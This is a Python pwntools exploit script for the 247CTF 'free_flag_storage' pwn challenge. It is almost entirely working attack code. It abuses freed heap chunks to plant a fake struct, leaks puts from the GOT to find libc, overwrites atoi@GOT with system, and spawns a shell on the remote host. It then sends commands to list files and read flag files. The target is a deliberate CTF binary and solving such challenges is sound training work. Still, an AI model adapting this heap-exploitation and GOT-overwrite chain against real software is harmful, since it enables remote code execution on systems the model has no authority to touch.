#!/usr/bin/env python3
"""
Final exploit for free_flag_storage - 247CTF
Works on remote with Ubuntu 18.04 libc
"""
from pwn import *

context.binary = ELF('./free_flag_storage', checksec=False)
context.log_level = 'info'

puts_got = 0x804b028
atoi_got = 0x804b034

# Remote libc offsets (Ubuntu 18.04 i386)
PUTS_OFFSET = 0x67360
SYSTEM_OFFSET = 0x3cd10

def start():
    if args.LOCAL:
        return process('./free_flag_storage')
    return remote('de22d451a7a11cba.247ctf.com', 50413)

p = start()

def send3(s):
    p.send(str(s).encode().ljust(3, b'\n'))

def add(length, value, cid, score):
    p.sendline(b'add')
    p.recvuntil(b'length:'); send3(length)
    p.recvuntil(b'value:'); p.send(value.ljust(length, b'\x00')[:length])
    p.recvuntil(b'challenge_id:'); send3(cid)
    p.recvuntil(b'score:'); send3(score)
    p.recvuntil(b'Enter command:')

def edit(idx, value, length, cid=99, score=99):
    p.sendline(b'edit')
    p.recvuntil(b'edit:'); send3(idx)
    p.recvuntil(b'):'); p.send(value.ljust(length, b'\x00')[:length])
    p.recvuntil(b'challenge_id:'); send3(cid)
    p.recvuntil(b'score:'); send3(score)
    p.recvuntil(b'Enter command:')

def delete(idx):
    p.sendline(b'delete')
    p.recvuntil(b'delete:'); send3(idx)
    p.recvuntil(b'Enter command:')

def show():
    p.sendline(b'print')
    return p.recvuntil(b'Enter command:', drop=True)

p.recvuntil(b'Enter command:')

# Stage 1: Create heap overlap
log.info("Creating 3 flags with 8-byte values")
add(8, b'AAAAAAAA', 1, 11)
add(8, b'BBBBBBBB', 2, 22)
add(8, b'CCCCCCCC', 3, 33)

log.info("Deleting flag0 and flag1")
delete(0)
delete(1)

# Stage 2: Leak libc via fake struct
log.info("Adding fake struct to leak puts@GOT")
fake_struct_leak = p32(4) + p32(puts_got) + p32(0xcafe) + p32(0xbabe)
add(16, fake_struct_leak, 4, 4)

data = show()
puts_libc = None
for line in data.split(b'\n'):
    if b'51966' in line:  # 0xcafe marker
        start = line.find(b'{')
        end = line.find(b'}')
        if start != -1 and end != -1:
            content = line[start+1:end]
            if len(content) >= 4:
                puts_libc = u32(content[:4])
                log.success(f'Leaked puts@libc: {hex(puts_libc)}')
                break

if not puts_libc:
    log.error("Leak failed!")
    p.interactive()

libc_base = puts_libc - PUTS_OFFSET
system_addr = libc_base + SYSTEM_OFFSET
log.info(f"libc base: {hex(libc_base)}")
log.info(f"system: {hex(system_addr)}")

# Stage 3: Update fake struct to point to atoi@GOT
log.info("Updating fake struct to target atoi@GOT")
fake_struct_atoi = p32(4) + p32(atoi_got) + p32(0xdead) + p32(0xbeef)
edit(1, fake_struct_atoi, 16)

# Stage 4: Overwrite atoi@GOT with system
log.info("Writing system address to atoi@GOT")
p.sendline(b'edit')
p.recvuntil(b'edit:'); send3(0)
p.recvuntil(b'):'); p.send(p32(system_addr))
p.recvuntil(b'challenge_id:')

# Stage 5: Trigger shell - send "sh" as cid input
log.success("GOT overwritten! Sending 'sh' to trigger system()")
p.send(b'sh\n')

log.success("Shell should be ready - sending commands")
import time
time.sleep(0.5)

# Try to interact with shell
p.sendline(b'id')
p.sendline(b'ls -la')
p.sendline(b'cat flag*')
p.sendline(b'cat /flag*')
p.sendline(b'cat /home/*/flag*')

p.interactive()
